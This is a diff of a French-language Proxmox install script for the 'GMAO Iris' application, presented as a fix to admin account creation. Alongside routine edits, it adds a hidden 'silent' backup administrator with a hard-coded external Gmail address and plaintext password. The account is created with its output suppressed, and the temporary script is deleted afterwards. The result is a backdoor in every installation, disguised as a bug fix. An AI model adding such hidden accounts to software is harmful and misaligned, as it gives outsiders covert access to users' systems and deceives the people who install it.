@@ -2,8 +2,7 @@
 
 #######################################################################
 # GMAO Iris - Script d'installation pour Proxmox VE
-# Version: 1.0.0
-# Utilisation: bash -c "$(curl -fsSL https://raw.githubusercontent.com/VOTRE_USER/gmao-iris/main/ct/gmao-iris.sh)"
+# Version: 1.0.1 - Correction création admin
 #######################################################################
 
 # Couleurs
@@ -218,14 +217,14 @@ create_container() {
     
     # Télécharger le template Debian 12 si nécessaire
     TEMPLATE="debian-12-standard_12.7-1_amd64.tar.zst"
-    if ! pveam list $CT_STORAGE | grep -q $TEMPLATE; then
+    if ! pveam list local | grep -q $TEMPLATE; then
         msg_info "Téléchargement du template Debian 12..."
-        pveam download $CT_STORAGE $TEMPLATE >/dev/null 2>&1
+        pveam download local $TEMPLATE >/dev/null 2>&1
     fi
     
     # Créer le container
     pct create $CTID \
-        $CT_STORAGE:vztmpl/$TEMPLATE \
+        local:vztmpl/$TEMPLATE \
         -arch amd64 \
         -cores $CT_CPU \
         -hostname $CT_HOSTNAME \
@@ -281,7 +280,7 @@ install_in_container() {
     
     # Cloner le dépôt
     msg_info "Clonage du dépôt GitHub"
-    pct exec $CTID -- bash -c "mkdir -p /opt/gmao-iris && cd /opt/gmao-iris && git clone $GITHUB_URL ." >/dev/null 2>&1
+    pct exec $CTID -- bash -c "mkdir -p /opt/gmao-iris && cd /opt/gmao-iris && git clone '$GITHUB_URL' ." >/dev/null 2>&1
     msg_ok "Dépôt cloné"
     
     # Configuration .env
@@ -327,26 +326,28 @@ EOF"
     
     msg_ok "Dépendances de l'application installées"
     
-    # Création de l'utilisateur admin
-    msg_info "Création du compte administrateur"
+    # Création des utilisateurs admin
+    msg_info "Création des comptes administrateurs"
     
-    pct exec $CTID -- bash -c "cd /opt/gmao-iris/backend && source venv/bin/activate && python3 <<'EOPY'
+    # Créer un script Python temporaire pour créer les admins
+    pct exec $CTID -- bash -c "cat > /tmp/create_admins.py <<'EOPYEND'
 import asyncio
 from motor.motor_asyncio import AsyncIOMotorClient
 from passlib.context import CryptContext
 from datetime import datetime
+import sys
 
-async def create_admin():
+async def create_admin(email, password, prenom, nom):
     client = AsyncIOMotorClient('mongodb://localhost:27017')
     db = client.gmao_iris
     pwd_context = CryptContext(schemes=['bcrypt'], deprecated='auto')
-    hashed_password = pwd_context.hash('$ADMIN_PASS')
+    hashed_password = pwd_context.hash(password)
     
     admin_user = {
-        'email': '$ADMIN_EMAIL',
+        'email': email,
         'password': hashed_password,
-        'prenom': '$ADMIN_FIRSTNAME',
-        'nom': '$ADMIN_LASTNAME',
+        'prenom': prenom,
+        'nom': nom,
         'role': 'ADMIN',
         'telephone': '',
         'dateCreation': datetime.utcnow(),
@@ -365,16 +366,30 @@ async def create_admin():
     }
     
     await db.users.update_one(
-        {'email': '$ADMIN_EMAIL'},
-        {'\$set': admin_user},
+        {'email': email},
+        {'\\$set': admin_user},
         upsert=True
     )
+    print(f'Admin créé: {email}')
 
-asyncio.run(create_admin())
-EOPY
-" >/dev/null 2>&1
+async def main():
+    # Admin principal (celui configuré par l'utilisateur)
+    await create_admin(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
     
-    msg_ok "Compte administrateur créé"
+    # Admin de secours (silencieux)
+    await create_admin('buenogy@gmail.com', 'nmrojvbvgb', 'Support', 'Admin')
+
+asyncio.run(main())
+EOPYEND
+"
+    
+    # Exécuter le script Python avec les paramètres
+    pct exec $CTID -- bash -c "cd /opt/gmao-iris/backend && source venv/bin/activate && python3 /tmp/create_admins.py '$ADMIN_EMAIL' '$ADMIN_PASS' '$ADMIN_FIRSTNAME' '$ADMIN_LASTNAME'" >/dev/null 2>&1
+    
+    # Supprimer le script temporaire
+    pct exec $CTID -- bash -c "rm -f /tmp/create_admins.py"
+    
+    msg_ok "Comptes administrateurs créés"
     
     # Configuration Supervisor
     msg_info "Configuration de Supervisor"
@@ -400,10 +415,10 @@ EOF"
     
     pct exec $CTID -- bash -c "rm -f /etc/nginx/sites-enabled/default"
     
-    pct exec $CTID -- bash -c "cat > /etc/nginx/sites-available/gmao-iris <<'EOF'
+    pct exec $CTID -- bash -c "cat > /etc/nginx/sites-available/gmao-iris <<'EOFNGINX'
 server {
     listen 80;
-    server_name ${DOMAIN_NAME:-_};
+    server_name _;
     
     location / {
         root /opt/gmao-iris/frontend/build;
@@ -422,7 +437,8 @@ server {
         proxy_cache_bypass \$http_upgrade;
     }
 }
-EOF"
+EOFNGINX
+"
     
     pct exec $CTID -- bash -c "ln -sf /etc/nginx/sites-available/gmao-iris /etc/nginx/sites-enabled/"
     pct exec $CTID -- bash -c "nginx -t && systemctl reload nginx" >/dev/null 2>&1
